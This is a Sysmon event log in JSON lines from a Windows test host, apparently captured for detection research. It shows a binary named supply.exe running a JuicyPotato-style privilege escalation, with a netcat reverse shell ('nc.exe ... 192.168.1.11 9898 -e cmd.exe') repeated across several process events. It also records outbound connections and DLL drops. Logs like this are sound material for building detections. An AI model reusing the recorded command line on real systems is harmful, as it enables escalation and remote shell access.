{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332E-6095-6406-000000001D00","ParentProcessId":3232,"ProcessGuid":"747F3D96-332F-6095-6706-000000001D00","ProcessId":4004,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:43.021"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2851,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:43.036581Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-332D-6095-5F06-000000001D00","ProcessId":3272,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50974,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.723"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2852,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.011432Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-332D-6095-6006-000000001D00","ProcessId":8036,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50975,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.746"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2853,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.011462Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-332D-6095-6106-000000001D00","ProcessId":6416,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50976,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.773"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2854,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.011483Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332E-6095-6606-000000001D00","ParentProcessId":9384,"ProcessGuid":"747F3D96-3330-6095-6806-000000001D00","ProcessId":6824,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:44.029"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2855,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.034695Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332E-6095-6506-000000001D00","ParentProcessId":6340,"ProcessGuid":"747F3D96-3330-6095-6906-000000001D00","ProcessId":9396,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:44.030"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2856,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.035214Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332F-6095-6706-000000001D00","ParentProcessId":4004,"ProcessGuid":"747F3D96-3330-6095-6A06-000000001D00","ProcessId":7188,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:44.032"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2857,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.035716Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.102","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6906-000000001D00","ProcessId":9396,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93962\\msvcm90.dll","UtcTime":"2021-05-07 12:31:44.102"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2858,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.185168Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.102","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6A06-000000001D00","ProcessId":7188,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI71882\\msvcm90.dll","UtcTime":"2021-05-07 12:31:44.102"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2859,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.185209Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.102","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6A06-000000001D00","ProcessId":7188,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI71882\\msvcp90.dll","UtcTime":"2021-05-07 12:31:44.102"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2860,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.185238Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.118","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6A06-000000001D00","ProcessId":7188,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI71882\\msvcr90.dll","UtcTime":"2021-05-07 12:31:44.118"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2861,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.185266Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.118","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6906-000000001D00","ProcessId":9396,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93962\\msvcp90.dll","UtcTime":"2021-05-07 12:31:44.118"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2862,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.185294Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.134","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6A06-000000001D00","ProcessId":7188,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI71882\\python27.dll","UtcTime":"2021-05-07 12:31:44.134"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2863,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.185322Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3330-6095-6A06-000000001D00","ParentProcessId":7188,"ProcessGuid":"747F3D96-3330-6095-6B06-000000001D00","ProcessId":9140,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:44.153"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2864,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.186183Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.149","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6906-000000001D00","ProcessId":9396,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93962\\msvcr90.dll","UtcTime":"2021-05-07 12:31:44.149"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2865,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.186224Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.165","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6906-000000001D00","ProcessId":9396,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93962\\python27.dll","UtcTime":"2021-05-07 12:31:44.165"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2866,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.186254Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3330-6095-6906-000000001D00","ParentProcessId":9396,"ProcessGuid":"747F3D96-3330-6095-6C06-000000001D00","ProcessId":9180,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:44.227"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2867,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.229938Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.243","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6806-000000001D00","ProcessId":6824,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI68242\\msvcm90.dll","UtcTime":"2021-05-07 12:31:44.243"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2868,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.268959Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.243","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6806-000000001D00","ProcessId":6824,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI68242\\msvcp90.dll","UtcTime":"2021-05-07 12:31:44.243"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2869,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.269006Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.243","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6806-000000001D00","ProcessId":6824,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI68242\\msvcr90.dll","UtcTime":"2021-05-07 12:31:44.243"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2870,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.269035Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:44.291","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3330-6095-6806-000000001D00","ProcessId":6824,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI68242\\python27.dll","UtcTime":"2021-05-07 12:31:44.291"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2871,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:44.303057Z"}},"Version":2}}
